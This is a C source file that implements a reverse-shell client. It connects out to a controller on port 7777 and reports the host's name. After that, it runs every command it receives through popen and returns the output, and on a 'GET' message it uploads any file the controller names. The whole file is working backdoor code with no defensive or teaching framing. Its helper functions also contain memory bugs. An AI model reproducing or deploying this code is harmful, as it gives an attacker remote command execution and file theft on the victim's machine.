#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>

char* itost(int x){
	int i=x;
	int c=0;
	while(i>10){
		i/=10;
		c++;
	}
	char* output = (char*)malloc(c+2);
	output[c+1]='\0';
	for(i=c;i>=0;i--){
		output[i] = 48+x%10;
		x/=10;
	}
	return output;
}

char* strip(char* s){
	int i,l=strlen(s),c=0;
	char* output;
	output =(char*)malloc(l);
	for(i=0;i<l;i++){
		if(s[i]!=' '){
			output[c]=s[i];
			c++;
		}
	}
	output[c]='\0';
	return output;
}

int* contains(char* string,char* pattern){
	int l1 = strlen(string);
	int l2 = strlen(pattern);
	int i,j;
	int *res;
	res = (int*)malloc(2*sizeof(int));
	res[0] = 0;
	res[1] = 1;
	for(i=0;i<l1-l2;i++){
		if(string[i]==pattern[0]){
			for(j=1;j<l2;j++)
				if(string[j+i]!=pattern[j]) break;
			if(j==l2){
				res[0] = 1;
				res[1] = i;
				return res;
			}
		}
	}
	return res;
}

char* cut(char* st,int pos1,int pos2,int flag=0){
	char* res;
	int i,l=strlen(st);
	res = (char*)malloc(l);
	if(flag){
		for(i=pos1;i<l;i++){
			res[i-pos1] = st[i];
		}
		res[i-pos1]='\0';
	}
	else{
		for(i=pos1;i<pos2;i++){
			res[i-pos1] = st[i];
		}
		res[i-pos1]='\0';
	}
	return res;
}
		
char** process(char* string,char* pattern){
	char** res;
	int i,l=strlen(string);
	res = (char**)malloc(2*sizeof(char*));
	for(i=0;i<2;i++){
		res[i] = (char*)malloc(l);
	}
	int pos = contains(string,pattern)[1];
	res[0] = cut(string,0,pos);
	res[1] = cut(string,pos+strlen(pattern),l);
	return res;
}

void sleepcos(int x){
	clock_t time;
	time = clock() + x*	CLOCKS_PER_SEC/1000;
	while(clock() <time){
	}
}


char* concat(char* string1,char* string2){
	char* output;
	int l1=strlen(string1),l2=strlen(string2);
	output=(char*)malloc(l1+l2);
	int i;
	for(i=0;i<l1+l2;i++){
		if(i<l1){
			output[i]=string1[i];
		}
		else{
			output[i]=string2[i-l1];
		}
	}
	return output;
}

void fileUpload(int s,char* path){
	printf("Sending\n");
	char msg[6] = {'R','e','a','d','y','\0'};
	char *pattern = "OK-2",c;
	send(s,msg,sizeof(msg),0);
	char *buff,buff2;	
	int coun = 0;
	puts(pattern);
	FILE *fp;
	fp = fopen(path,"r");
	printf("The file is opened\n");	
	buff = (char*)malloc(1024);
	recv(s,buff,1024,0);
	fseek(fp,0L,SEEK_END);
	memset(buff,0,sizeof(buff));
	int sz = ftell(fp);
	buff = itost(sz);
	send(s,buff,sizeof(buff),0);
	rewind(fp);
	int cou = 0;
	memset(buff,0,sizeof(buff));
	recv(s,buff,1024,0);
	memset(buff,0,sizeof(buff));
	while(1){
		cou++;
		c = fgetc(fp);
		if(cou==sz){
			break ;
		}
		send(s,&c,1,0);
	}
	printf("Ok\n");
	fclose(fp);
}

int main(){
	int s,status;
	struct sockaddr_in server;
	struct in_addr ipv4addr;
	FILE *fp;
	char msg[1024],buff[1024],*buff2,*path,pattern[4]={'*','$',':','\0'};
	char *patterns[4] = {"GET","","",""};
	buff2 = (char*)malloc(1024);
	path = (char*)malloc(1024);
	s = socket(AF_INET,SOCK_STREAM,0);
	if(s<0)
		return 0;
	server.sin_family = AF_INET;
	server.sin_port = htons(7777);
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	char hostname[1024];
	hostname[1023] = '\0';
	gethostname(hostname, 1023);
	if(connect(s,(sockaddr*)&server,sizeof(server)) < 0){
		return 0;
	}
	memset(buff,0,sizeof(buff));
	recv(s,buff,1024,0);
	// printf("%s\n",buff);
	send(s,hostname,strlen(hostname),0);
	memset(buff,0,sizeof(buff));
	recv(s,buff,1024,0);
	while(1){
		memset(buff,0,sizeof(buff));
		memset(buff2,0,sizeof(buff2));
		recv(s,buff,1024,0);
		puts(buff);
		if(contains(buff,patterns[0])[0]){
			int pos = contains(buff,pattern)[1];
			char* path;
			printf("%d\n",pos);
			path = (char*)malloc(50);
			path = cut(buff,pos+2,0,1);
			fileUpload(s,path);
		}
		else{
			fp = popen(buff, "r");
			if (fp == NULL)
				return 0;
			while (fgets(path, 1024, fp) != NULL){
				buff2 = concat(buff2,path);
			}
			status = pclose(fp);
			send(s,buff2,strlen(buff2),0);
		}
	}
}
		